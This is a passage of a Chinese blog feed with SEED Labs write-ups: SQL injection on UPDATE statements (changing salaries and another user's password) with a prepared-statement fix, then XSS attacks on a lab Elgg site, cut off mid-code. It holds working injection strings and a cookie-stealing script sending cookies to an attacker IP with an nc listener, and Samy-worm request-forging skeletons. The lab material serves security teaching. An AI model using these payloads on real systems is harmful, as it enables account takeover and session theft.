id="Task-3-SQLInjection-Attack-on-UPDATE-Statement">Task 3: SQLInjection Attack on UPDATE Statement</h3><h4 id="Task-3-1-Modify-your-own-salary">Task 3.1: Modify your own salary.</h4><p>任务： 使用Alice的账号，在个人信息编辑页面利用update增加salary的值。</p><p>在这之前我们要意识到在task2中我们把Alice改成了Austin，因此还需要先改回来</p><p>1.观察题目所给代码，发现我们可以按照TASK2的思路，使用’使上一句闭合后，嵌入我们想要的语句。随即找一个注入点，修改salary=10000000。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa&#x27;,Salary=&#x27;<span class="number">88888888</span></span><br></pre></td></tr></table></figure><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230201236.png" alt="image-20251210112649653"></p><p>2.注入完成后，查看salary确实修改成功。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230202007.png" alt="image-20251210112709100"></p><h4 id="Task-3-2-Modify-other-people’-salary">Task 3.2: Modify other people’ salary.</h4><p>任务： 将Boby的salary降为1。</p><p>1.观察参考代码，发现定位用的 WHERE 语句我们无法直接修改，所以参考 TASK2 的思路将后面的语句直接用#注释掉。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230202742.png" alt="image-20251210114320396"></p><p>2.随机找一个注入点输入下面的内容后保存。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">aaa</span>&#x27;,Salary=<span class="number">1</span> Where ID=<span class="number">2</span>#</span><br></pre></td></tr></table></figure><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230203527.png" alt="image-20251210114515277"></p><p>3.可以看到Boby的Salay已被成功更改。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230204433.png" alt="image-20251210143624106"></p><h4 id="Task-3-3-Modify-other-people’-password">Task 3.3: Modify other people’ password.</h4><p>任务： 将Boby的Password修改成我们设定的值。</p><p>1.根据题目提示，在数据库中存储的password是经过SHA1加密后的结果。所以我们应将我们设定的Password的plaintext经过SHA1加密后的结果存进数据库。我们设定 Austin为Password的plaintext。</p><p><a href="https://www.jyshare.com/crypto/sha1/">SHA1 在线加密工具 | 菜鸟工具</a></p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230205421.png" alt="image-20251210143818259"></p><p>2.将对应的密码存入数据库。</p><p>3.成功使用修改后的密码登录进入Boby的账号。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230206500.png" alt="image-20251210144707113"></p><h3 id="Task-4-Countermeasure-—-Prepared-Statement">Task 4: Countermeasure — Prepared Statement</h3><p>预处理语句 （Prepared Statement）的工作方式</p><p>SQL 注入漏洞的根本问题在于未能将代码与数据分开。在编写 SQL 语句时，程序（如 PHP 程序）知道哪一部分是数据，哪一部分是代码。不幸的是，当 SQL 语句被发送到数据库时，边界已经消失；SQL 解释器看到的边界可能与开发人员设置的原始边界不同。要解决这个问题，必须确保服务器端代码和数据库中的边界视图保持一致。最安全的方法是使用准备语句。</p><p>要了解准备语句如何防止 SQL 注入，我们需要了解 SQL 服务器接收查询时会发生什么。执行查询的高级工作流程如图 3 所示。在编译步骤中，查询首先要经过解析和规范化阶段，即根据语法和语义检查查询。下一阶段是编译阶段，在这一阶段，关键字（如 SELECT、FROM、UPDATE 等）被转换成机器可以理解的格式。基本上，在这一阶段，查询会被解释。在查询优化阶段，会考虑多种不同的查询执行计划，从中选出最佳优化计划。被选中的计划会存储在缓存中，因此每当有下一个查询进来时，就会根据缓存中的内容进行检查；如果缓存中已经存在该计划，则会跳过解析、编译和查询优化阶段。然后，编译后的查询将被传递到执行阶段，并在那里得到实际执行。</p><p>预处理语句出现在编译之后，执行步骤之前。预编译语句将经过编译步骤，并变成一个预编译查询，其中的数据占位符为空。要运行这个预编译查询，需要提供数据，但这些数据不会经过编译步骤，而是直接插入预编译查询，然后发送到执行引擎。因此，即使数据中包含 SQL 代码，在不经过编译步骤的情况下，代码也会被简单地视为数据的一部分，没有任何特殊含义。这就是准备语句防止 SQL 注入攻击的方法。</p><p>下面是一个如何在 PHP 中编写准备语句的示例。在下面的示例中，我们使用了 SELECT 语句。我们展示了如何使用准备语句重写易受 SQL 注入攻击的代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT name, local, gender</span></span><br><span class="line"><span class="string"> FROM USER_TABLE</span></span><br><span class="line"><span class="string"> WHERE id = <span class="variable">$id</span> AND password =’<span class="variable">$pwd</span>’ &quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>)</span><br></pre></td></tr></table></figure><p>上述代码容易受到 SQL 注入攻击。可将其重写如下</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $conn-&gt;prepare(<span class="string">&quot;SELECT name, local, gender</span></span><br><span class="line"><span class="string"> FROM USER_TABLE</span></span><br><span class="line"><span class="string"> WHERE id = ? and password = ? &quot;</span>)<span class="comment">;</span></span><br><span class="line"> // Bind parameters <span class="keyword">to</span> the query</span><br><span class="line"> $stmt-&gt;bind_param(<span class="string">&quot;is&quot;</span>, $id, $pwd)<span class="comment">;</span></span><br><span class="line"> $stmt-&gt;<span class="built_in">execute</span>()<span class="comment">;</span></span><br><span class="line"> $stmt-&gt;bind_result($bind_name, $bind_local, $bind_gender)<span class="comment">;</span></span><br><span class="line"> $stmt-&gt;fetch()<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>利用预处理语句机制，我们将向数据库发送 SQL 语句的过程分为两步。第一步是只发送代码部分，即不包含实际数据的 SQL 语句。这就是准备步骤。从上面的代码片段中我们可以看到，实际数据被问号（?） 完成这一步后，我们使用 bindparam() 将数据发送到数据库。数据库只会将这一步发送的所有数据视为数据，而不再是代码。它会将数据与准备语句中相应的问号绑定。在 bindparam() 方法中，第一个参数 “is ”表示参数的类型： i “表示 $id 中的数据为整数类型，”s &quot;表示 $pwd 中的数据为字符串类型。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230207544.png" alt="image-20251210144951106"></p><p>任务： 进入 <a href="http://www.seedlabsqlinjection.com/defense%EF%BC%8C%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9">www.seedlabsqlinjection.com/defense，通过修改</a> unsafe.php使该网站能够防御SQL注入攻击。</p><p>1.进入该网站，对其进行SQL攻击测试，发现其能够被SQL注入攻击。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230208449.png" alt="image-20251210145053170"></p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230209321.png" alt="image-20251210145109678"></p><p>2.选择题目中的第二个方法在运行中的容器中进行修改，进入docker，进入/var/www/SQL_Injection/defense，编辑unsafe.php。</p><p>修改前：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT id, name, eid, salary, ssn</span></span><br><span class="line"><span class="string">                        FROM credential</span></span><br><span class="line"><span class="string">                        WHERE name= &#x27;<span class="subst">$input_uname</span>&#x27; and Password= &#x27;<span class="subst">$hashed_pwd</span>&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><p>修改后：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT id, name, eid, salary, ssn FROM credential WHERE name= ? and Password= ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$input_uname</span>, <span class="variable">$hashed_pwd</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">get_result</span>();</span><br></pre></td></tr></table></figure><ol start="3"><li>再次尝试使用单引号攻击，发现攻击失败，成功防御。</li></ol><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251210230210276.png" alt="image-20251210145436251"></p>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Seed-Labs </tag>
            
            <tag> Web Security </tag>
            
            <tag> SQL Injection </tag>
            
            <tag> Database Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Seed-Labs 2.0】Cross-Site Scripting (XSS) Attack Lab (Web Application- Elgg)</title>
      <link href="/posts/83dcefb7.html"/>
      <url>/posts/83dcefb7.html</url>
      
        <content type="html"><![CDATA[<h1>【Seed-Labs 2.0】Cross-Site Scripting (XSS) Attack Lab (Web Application: Elgg)</h1><h3 id="Overview">Overview</h3><p>跨站脚本 (XSS) 是网络应用程序中常见的一种漏洞。攻击者可利用该漏洞向受害者的网络浏览器注入恶意代码（如 JavaScript 程序）。利用这些恶意代码，攻击者可以窃取受害者的凭证，如会话 cookie。利用 XSS 漏洞可绕过浏览器为保护这些凭证而采用的访问控制策略（即同一来源策略）。</p><h3 id="LabEnvironmentSetup">LabEnvironmentSetup</h3><h3 id="DNSSetup">DNSSetup</h3><p>我们为本实验室建立了几个网站。它们由容器 10.9.0.5 托管。我们需要将网络服务器的名称映射到该 IP 地址。请在 /etc/hosts 中添加以下条目。您需要使用 root 权限来修改此文件：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10.9.0.5</span> www.seed-server.com</span><br><span class="line"><span class="number">10.9.0.5</span> www.example32a.com</span><br><span class="line"><span class="number">10.9.0.5</span> www.example32b.com</span><br><span class="line"><span class="number">10.9.0.5</span> www.example32c.com</span><br><span class="line"><span class="number">10.9.0.5</span> www.example60.com</span><br><span class="line"><span class="number">10.9.0.5</span> www.example70.com</span><br></pre></td></tr></table></figure><h3 id="Container-Set-up-and-Commands">Container Set up and Commands</h3><p>下面是该容器中的一些常用命令。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$docker</span>-composebuild <span class="comment">#Buildthecontainerimage</span></span><br><span class="line"><span class="variable">$docker</span>-composeup <span class="comment">#Startthecontainer</span></span><br><span class="line"><span class="variable">$docker</span>-composedown <span class="comment">#Shutdownthecontainer</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>Aliases fortheComposecommandsabove</span><br><span class="line"><span class="variable">$dcbuild</span> <span class="comment">#Aliasfor:docker-composebuild</span></span><br><span class="line"><span class="variable">$dcup</span> <span class="comment">#Aliasfor:docker-composeup</span></span><br><span class="line"><span class="variable">$dcdown</span><span class="comment">#Aliasfor:docker-composedown</span></span><br></pre></td></tr></table></figure><h3 id="Elgg-WebApplication">Elgg WebApplication</h3><p>在本实验中，我们使用一个名为 Elgg 的开源网络应用程序。Elgg 是一个基于网络的社交网络应用程序。它已在提供的容器镜像中设置好；其 URL 为 <a href="http://www.seed-server.com">http://www.seed-server.com</a>。我们使用两个容器，一个运行网络服务器（10.9.0.5），另一个运行 MySQL 数据库（10.9.0.6）。这两个容器的 IP 地址被硬编码在配置的不同地方，所以请不要从 docker-compose.yml 文件中修改它们。</p><p><strong>MySQL database.</strong> 容器通常是一次性的，因此一旦被销毁，容器内的所有数据都会丢失。在本实验室中，我们确实希望保留 MySQL 数据库中的数据，这样在关闭容器时就不会丢失我们的工作。为此，我们将主机上的 mysql 数据文件夹（在 Labsetup 中，它将在 MySQL 容器运行一次后创建）挂载到 MySQL 容器内的 /var/lib/mysql 文件夹。该文件夹是 MySQL 存储数据库的地方。因此，即使容器被毁，数据库中的数据仍会保留。如果确实想从一个干净的数据库开始，可以删除此文件夹：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> sudo <span class="built_in">rm</span><span class="literal">-rf</span> mysql_data</span><br></pre></td></tr></table></figure><p>User accounts. 我们在 Elgg 服务器上创建了几个用户账户，用户名和密码如下。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">UserName<span class="keyword">Password</span></span><br><span class="line"><span class="keyword">admin</span>seedelgg</span><br><span class="line">aliceseedalice</span><br><span class="line">bobyseedboby</span><br><span class="line">charlieseedcharlie</span><br><span class="line">samyseedsamy</span><br></pre></td></tr></table></figure><h3 id="LabTasks">LabTasks</h3><p>当您复制和粘贴 PDF 文件中的代码时，引号（尤其是单引号）往往会变成另一种看起来相似的符号。它们会导致代码出错，因此请牢记这一点。出现这种情况时，请删除它们，然后手动输入这些符号。</p><h4 id="Preparation-Getting-Familiar-with-the-“HTTP-Header-Live”-tool">Preparation: Getting Familiar with the “HTTP Header Live” tool</h4><p>在本实验中，我们需要构建 HTTP 请求。要想知道 Elgg 中可接受的 HTTP 请求是什么样的，我们需要能够捕获并分析 HTTP 请求。为此，我们可以使用名为 “HTTP Header Live ”的 Firefox 附加组件。在开始本实验之前，你应该熟悉这个工具。指南部分（§ 5.1）将介绍如何使用该工具。</p><h4 id="Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window">Task 1: Posting a Malicious Message to Display an Alert Window</h4><p>此任务的目的是在您的 Elgg 配置文件中嵌入 JavaScript 程序，这样当其他用户查看您的配置文件时，JavaScript 程序将被执行并显示一个警报窗口。下面的 JavaScript 程序将显示一个警报窗口：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(’XSS’);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果您在个人档案中嵌入上述 JavaScript 代码（例如在简要说明字段中），那么任何查看您个人档案的用户都会看到提示窗口。</p><p>在这种情况下，JavaScript 代码足够短，可以输入到简短描述字段中。如果想运行较长的 JavaScript，但又受限于在表单中键入的字符数，可以将 JavaScript 程序存储在一个独立文件中，以 .js 扩展名保存，然后使用</p><script type="text/javascript" src="http://www.example.com/myscripts.js"> </script><p>在上例中，页面将从 <a href="http://www.example.com">http://www.example.com</a>（可以是任何网络服务器）获取 JavaScript 程序。</p><p>操作过程：</p><p>任务：利用XSS攻击来显示一句恶意的话。</p><p>1.登录Boby账号，在其 profile 的 Brief descriptions 中输入弹窗提示代码 。</p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131157296.png" alt="image-20251209124341769" style="zoom:67%;" /><p>2.用Boby本人账号进入Boby主页即可看到弹窗。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131157478.png" alt="image-20251209124413897"></p><p>3.用其他人的账号进入Boby主页也能看到弹窗（登录的是alice的账号）</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131157351.png" alt="image-20251209130950568"></p><p>4.不登陆账号查看Boby主页也能看到弹窗。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131157437.png" alt="image-20251209131053656"></p><h4 id="Task-2-Posting-a-Malicious-Message-to-Display-Cookies">Task 2: Posting a Malicious Message to Display Cookies</h4><p>操作过程</p><p>任务：利用XSS攻击来显示访问的Cookies</p><p>1.登录Boby账号，在其 profile 的 Brief descriptions 中修改TASK1的代码。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;You have been attacked!! your cookie:&quot;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131157393.png" alt="image-20251209131306155"></p><p>2.用Boby本人的账号查看Boby的主页会显示其cookies的值。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131157529.png" alt="image-20251209131327467"></p><p>3.不登录账号查看Boby的主页会显示其cookies的值。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131207473.png" alt="image-20251209131359990"></p><p>4.用其他人的账号查看Boby的主页会显示其cookies的值。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131208559.png" alt="image-20251209131430016"></p><h4 id="Task-3-Stealing-Cookies-from-the-Victim’s-Machine">Task 3: Stealing Cookies from the Victim’s Machine</h4><p>在上一个任务中，攻击者编写的恶意 JavaScript 代码可以打印出用户的 cookie，但只有用户可以看到 cookie，攻击者看不到。在本任务中，攻击者希望 JavaScript 代码将 cookie 发送给自己。为此，恶意 JavaScript 代码需要向攻击者发送 HTTP 请求，并在请求中附加 Cookie。</p><p>我们可以让恶意 JavaScript 插入 标签，并将其 src 属性设置为攻击者的机器，从而实现这一目的。当 JavaScript 插入 img 标签时，浏览器会尝试从 src 字段中的 URL 加载图片；这样就会向攻击者的机器发送 HTTP GET 请求。下面给出的 JavaScript 会将 cookie 发送到攻击者机器（IP 地址为 10.9.0.1）的 5555 端口，攻击者的 TCP 服务器会监听同一端口。</p><script>document.write(’<img src=http://10.9.0.1:5555?c=’ + escape(document.cookie) + ’ >’);</script><p>攻击者常用的程序是 netcat（或 nc），如果使用“-l ”选项运行，它就会成为一个 TCP 服务器，在指定端口上监听连接。该服务器程序基本上是将客户端发送的内容打印出来，并将运行服务器的用户输入的内容发送给客户端。键入下面的命令，监听 5555 端口：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>nc-lknv <span class="number">5555</span></span><br></pre></td></tr></table></figure><p>l 选项用于指定 nc 应侦听传入连接，而不是启动与远程主机的连接。-nv选项用于让nc提供更多冗余输出。k 选项表示当一个连接完成后，监听另一个连接。</p><p><strong>操作过程</strong></p><p>任务：利用XSS攻击偷取受害者的Cookie。</p><p>1.对本机的5555端口进行监听。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131209639.png" alt="image-20251209132115239"></p><p>2.登录Boby账号，在其 profile 的 Brief descriptions 中修改TASK1的代码，令其将获得的cookie值发送到攻击者手上。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;img src=&#x27;http://127.0.0.1:5555?c=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span> +<span class="string">&quot;\&#x27;&gt;&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131212616.png" alt="image-20251209132622942"></p><p>3.登录Boby 账号查看Boby主页时监听的结果。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131213580.png" alt="image-20251209132652584"></p><p>4.未登录状态下查看Boby主页时监听的结果。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131214500.png" alt="image-20251209132724975"></p><p>5.其他用户查看Boby主页时监听的结果。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131215428.png" alt="image-20251209132753146"></p><h4 id="Task-4-Becoming-the-Victim’s-Friend">Task 4: Becoming the Victim’s Friend</h4><p>在本任务和下一个任务中，我们将执行类似于 2005 年 Samy 对 MySpace 所做的攻击（即 Samy 蠕虫）。我们将编写一个 XSS 蠕虫，将访问 Samy 页面的任何其他用户添加为 Samy 的好友。该蠕虫不会自我传播；在任务 6 中，我们将使其自我传播。</p><p>在这项任务中，我们需要编写一个恶意 JavaScript 程序，在没有攻击者干预的情况下，直接从受害者的浏览器伪造 HTTP 请求。攻击的目的是将 Samy 添加为受害者的好友。我们已经在 Elgg 服务器上创建了一个名为 Samy 的用户（用户名为 samy）。</p><p>要为受害者添加好友，我们首先要弄清楚合法用户如何在 Elgg 中添加好友。更具体地说，我们需要找出用户添加好友时发送到服务器的内容。Firefox 的 HTTP 检查工具可以帮助我们获取信息。它可以显示从浏览器发送的任何 HTTP 请求信息的内容。通过这些内容，我们可以确定请求中的所有参数。第 5 节提供了该工具的使用指南。</p><p>了解添加好友 HTTP 请求的外观后，我们就可以编写 JavaScript 程序来发送相同的 HTTP 请求。我们提供的 JavaScript 代码骨架有助于完成这项任务。</p> <script type="text/javascript"> window.onload = function () { var Ajax=null; var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; var token="&__elgg_token="+elgg.security.token.__elgg_token; //Construct the HTTP request to add Samy as a friend. var sendurl=...; //FILL IN//Create and send Ajax request to add friend Ajax=new XMLHttpRequest(); Ajax.open("GET", sendurl, true); Ajax.send();} </script><p>上述代码应放在 Samy 个人资料页面的 “关于我 ”字段中。该字段提供两种编辑模式： 编辑器模式（默认）和文本模式。编辑器模式会在输入的文本中添加额外的 HTML 代码，而文本模式不会。由于我们不希望在攻击代码中添加任何额外代码，因此在输入上述 JavaScript 代码之前，应启用文本模式。这可以通过点击 “关于我 ”文本字段右上角的 “编辑 HTML ”来实现。</p><p><strong>Question</strong></p><ul><li><p>Question1: 解释代码行 ① 和 ②，说明其作用</p></li><li><p>Question2: 如果 Elgg 应用程序只为 “关于我 ”字段提供编辑器模式，即您无法切换到文本模式，您还能成功发起攻击吗？</p></li></ul><p><strong>操作过程</strong></p><p>任务：利用XSS攻击让受害者自动添加用户Samy为好友。</p><p>1.登录Boby账号添加 Samy 为好友，操作后使用HTTP Header Live 抓取信息。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131216293.png" alt="image-20251209140507115"></p><p>2.查看好友请求信息，可以得知 Samy的id为59.</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131216963.png" alt="image-20251209140550249"></p><p>3.结合题目提供的参考代码和抓取的请求信息，在Boby的profile中About me部分写入下面的代码后保存。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131217711.png" alt="image-20251209143841623"></p><p>4.登录Boby账号，删除Samy好友后，查看Boby的主页，看到成功添加 Samy为好友。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131218385.png" alt="image-20251209143749603"></p><p>5.登录Alice账号，查看Boby的主页后，看到已成功添加 Samy为好友。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131219062.png" alt="image-20251209143753324"></p><p>问题解释</p><p>Q1: 解释脚本中的ts和token的作用<br>ts 和 token其实就是防御CSRF攻击的秘密令牌，在请求时会被发送到服务端进行校验，校验通过请求才有效。这里我们模拟发送添加好友请求自然也要在请求中附带这些令牌值。</p><p>Q2: 如果没有Edit HTML模式，只能用普通的Editor Mode，还能攻击成功吗？<br>不可以。因为它会在代码中添加各种标签并转义一些符号，如把&lt;变成&lt; 所以攻击不可能成功。</p><h4 id="Task5-Modifying-the-Victim’s-Profile">Task5:Modifying the Victim’s Profile</h4><p>这项任务的目的是在受害者访问 Samy 的网页时修改受害者的个人资料。具体来说，就是修改受害者的 “关于我 ”字段。我们将编写一个 XSS 蠕虫来完成任务。该蠕虫不会自我传播；在任务 6 中，我们将使其自我传播。</p><p>与之前的任务类似，我们需要编写一个恶意 JavaScript 程序，在没有攻击者干预的情况下，直接从受害者的浏览器伪造 HTTP 请求。要修改个人资料，我们首先要找出合法用户是如何在 Elgg 中编辑或修改其个人资料的。更具体地说，我们需要弄清如何构造 HTTP POST 请求来修改用户配置文件。我们将使用 Firefox 的 HTTP in spection 工具。了解修改用户配置文件 HTTP POST 请求的结构后，我们就可以编写一个 JavaScript 程序来发送相同的 HTTP 请求。我们将提供一段 JavaScript 代码骨架，以帮助完成这项任务。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;scripttype=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">window.onload=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"> <span class="comment">//JavaScriptcodetoaccessusername,userguid,TimeStamp__elgg_ts</span></span><br><span class="line"> <span class="comment">//andSecurityToken__elgg_token</span></span><br><span class="line"> varuserName=<span class="string">&quot;&amp;name=&quot;</span>+elgg.session.user.name;</span><br><span class="line"> varguid=<span class="string">&quot;&amp;guid=&quot;</span>+elgg.session.user.<span class="built_in">guid</span>;</span><br><span class="line"> varts=<span class="string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.security.token.__elgg_ts;</span><br><span class="line"> vartoken=<span class="string">&quot;&amp;__elgg_token=&quot;</span>+elgg.security.token.__elgg_token;</span><br><span class="line"> <span class="comment">//Constructthecontentofyoururl.</span></span><br><span class="line"> varcontent=...; <span class="comment">//FILLIN</span></span><br><span class="line"> varsamyGuid=...; <span class="comment">//FILLIN</span></span><br><span class="line"> varsendurl=...; <span class="comment">//FILLIN</span></span><br><span class="line"> <span class="keyword">if</span>(elgg.session.user.<span class="built_in">guid</span>!=samyGuid)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="comment">//CreateandsendAjaxrequesttomodifyprofile</span></span><br><span class="line"> varAjax=<span class="literal">null</span>;</span><br><span class="line"> Ajax=newXMLHttpRequest();</span><br><span class="line"> Ajax.open(<span class="string">&quot;POST&quot;</span>,sendurl,<span class="literal">true</span>);</span><br><span class="line">Ajax.setRequestHeader(<span class="string">&quot;Content-Type&quot;</span>,</span><br><span class="line"> <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line"> Ajax.send(content);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>与任务 4 类似，上述代码应放在 Samy 个人档案页面的 “AboutMe ”字段中，在输入上述 JavaScript 代码之前，应启用文本模式。</p><ul><li><p>Question 3: Why do we need Line ? Remove this line ①, and repeat your attack. Report and explain your observation.</p><p><strong>操作过程</strong></p></li></ul><p>任务：通过XSS修改别人主页的About me板块。</p><p>1.首先在Samy的主页修改一下About me然后保存的同时用插件捕捉抓包，找到包含About me内容的部分。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131219787.png" alt="image-20251209145101952"></p><p>2.接口地址为：<a href="http://www.seed-server.com/action/profile/edit%EF%BC%8C%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F">http://www.seed-server.com/action/profile/edit，请求方式</a> 为POST</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211131220482.png" alt="image-20251209145142267"></p><p>注：POST请求的重要字段：</p><p>name：说明被修改的用户是谁<br>description：说明修改<br>about me 内容<br>accesslevel[description]：说明修改权限<br>guid：修改人的编号<br>3.参考题目给出的示例代码和我们抓取的信息在Samy的About me部分书写下面的代码。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> 